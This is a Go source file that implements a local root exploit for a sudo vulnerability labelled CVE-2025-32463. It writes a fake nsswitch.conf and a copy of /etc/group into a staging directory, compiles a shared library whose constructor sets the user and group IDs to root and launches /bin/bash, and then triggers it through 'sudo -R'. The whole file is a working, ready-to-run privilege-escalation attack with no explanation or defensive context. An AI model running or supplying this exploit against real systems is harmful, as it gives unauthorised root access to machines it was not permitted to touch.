package CVE_2025_32463

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
)

const cCode = `
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
`

type Exploit struct{}

func (e *Exploit) Run() {
	stage, err := ioutil.TempDir("/tmp", "sudowoot.stage.")
	if err != nil {
		log.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(stage)

	fmt.Println("[+] Created stage directory:", stage)

	err = os.Chdir(stage)
	if err != nil {
		log.Fatalf("Failed to change directory: %v", err)
	}

	// Write C code
	cPath := filepath.Join(stage, "woot1337.c")
	err = ioutil.WriteFile(cPath, []byte(cCode), 0644)
	if err != nil {
		log.Fatalf("Failed to write C file: %v", err)
	}

	// Setup directory structure
	os.MkdirAll("woot/etc", 0755)
	os.MkdirAll("libnss_", 0755)

	// Write nsswitch.conf
	nsswitch := []byte("passwd: /woot1337\n")
	err = ioutil.WriteFile("woot/etc/nsswitch.conf", nsswitch, 0644)
	if err != nil {
		log.Fatalf("Failed to write nsswitch.conf: %v", err)
	}

	// Copy /etc/group
	groupBytes, err := os.ReadFile("/etc/group")
	if err != nil {
		log.Fatalf("Failed to read /etc/group: %v", err)
	}
	err = ioutil.WriteFile("woot/etc/group", groupBytes, 0644)
	if err != nil {
		log.Fatalf("Failed to write group file: %v", err)
	}

	// Compile shared object
	cmd := exec.Command("gcc", "-shared", "-fPIC", "-Wl,-init,woot", "-o", "libnss_/woot1337.so.2", "woot1337.c")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		log.Fatalf("Failed to compile shared object: %v", err)
	}

	fmt.Println("[+] Compiled malicious shared library.")

	// Trigger sudo -R
	cmd = exec.Command("sudo", "-R", "woot", "woot")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		log.Fatalf("Failed to trigger sudo -R: %v", err)
	}
}
